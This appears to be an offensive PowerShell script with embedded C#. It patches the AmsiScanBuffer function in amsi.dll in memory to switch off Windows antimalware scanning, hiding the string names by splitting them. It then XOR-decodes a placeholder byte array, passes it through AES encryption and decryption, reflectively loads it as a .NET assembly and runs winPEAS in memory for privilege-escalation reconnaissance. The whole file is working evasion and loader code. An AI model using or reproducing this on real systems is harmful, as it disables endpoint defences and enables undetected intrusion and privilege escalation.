$data = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class Program
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Run()
    {
        IntPtr lib = LoadLibrary("a"+"m"+"si."+"dll");
        IntPtr amsi = GetProcAddress(lib, "Am"+"s"+"iScan"+"B"+"uffer");
        IntPtr final = IntPtr.Add(amsi, 0x95);
        uint old = 0;
        VirtualProtect(final, (UInt32)0x1, 0x40, out old);

        Console.WriteLine(old);
        byte[] patch = new byte[] { 0x75 };

        Marshal.Copy(patch, 0, final, 1);

        VirtualProtect(final, (UInt32)0x1, old, out old);
    }
}
"@

function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function De-Xor {
    param([byte[]]$xor_data)
    $key = 0x41
    $xored_data = [byte[]]::new($xor_data.Length)
    for ($i = 0; $i -lt $xor_data.Length; $i++) {
        $xored_data[$i] = $xor_data[$i] -bxor $key
    }
    return $xored_data
}


Add-Type $data -Language CSharp 

[Program]::Run()

$key = Create-AesKey
#$key

#This is filler data, you will need to generate the byte array
$xor_data = @(0x0C,0x1B,0xD1,0x41,0x42,0x41,0x41,0x41,0x45,0x41,0x41,0x41,0xBE)


$binary_data = De-Xor $xor_data
$bs = [Convert]::ToBase64String($binary_data)
$es = Encrypt-String $key $bs
$back_to_bs = Decrypt-String $key $es
$back_to_binary = [Convert]::FromBase64String($back_to_bs)
$asm = [System.Reflection.Assembly]::Load([byte[]]$back_to_binary)
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter)
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
